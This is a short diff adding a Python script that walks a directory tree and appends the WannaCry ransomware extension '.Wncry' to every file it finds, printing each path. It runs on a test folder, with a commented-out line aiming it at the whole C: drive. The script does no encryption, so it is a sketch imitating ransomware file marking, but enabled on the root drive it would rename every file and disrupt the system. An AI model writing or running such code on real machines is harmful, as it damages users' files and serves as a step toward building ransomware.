@@ -1,0 +1,12 @@
+import os
+
+def GetListOfPath(path):
+    for root, dirs, files in os.walk(path):
+        for filename in files:
+            string = os.path.join(root, filename)
+           
+            os.rename(string, string + ".Wncry")
+            print (string)
+    
+GetListOfPath ("C:\\test1")
+#GetListOfPath ("C:\\")
